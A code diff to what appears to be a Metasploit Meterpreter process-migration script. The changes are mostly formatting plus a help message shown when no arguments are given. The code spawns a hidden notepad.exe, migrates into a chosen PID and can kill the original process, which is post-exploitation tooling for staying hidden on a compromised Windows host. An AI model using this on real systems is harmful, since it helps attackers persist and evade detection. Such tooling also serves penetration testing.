@@ -4,15 +4,16 @@
 # This is meant as an illustration.
 #
 
+
 spawn = false
 kill = false
 target_pid = nil
 
 opts = Rex::Parser::Arguments.new(
-	"-h" => [ false,"Help menu." ],
+	"-h" => [ false, "Help menu." ],
 	"-f" => [ false, "Launch a process and migrate into the new process"],
 	"-p" => [ true , "PID to migrate to."],
-	"-k" => [ false,  "Kill original process."]
+	"-k" => [ false, "Kill original process."]
 )
 opts.parse(args) { |opt, idx, val|
 	case opt
@@ -31,7 +32,6 @@ opts.parse(args) { |opt, idx, val|
 	end
 }
 
-
 # Creates a temp notepad.exe to migrate to depending the architecture.
 def create_temp_proc()
 	sysinfo =  client.sys.config.sysinfo
@@ -46,6 +46,13 @@ def create_temp_proc()
 	proc = client.sys.process.execute(cmd, nil, {'Hidden' => true })
 	return proc.pid
 end
+# In case no option is provided show help
+if args.length == 0
+	print_line(opts.usage)
+	raise Rex::Script::Completed
+end
+
+### Main ###
 
 if client.platform =~ /win32|win64/
 	server = client.sys.process.open
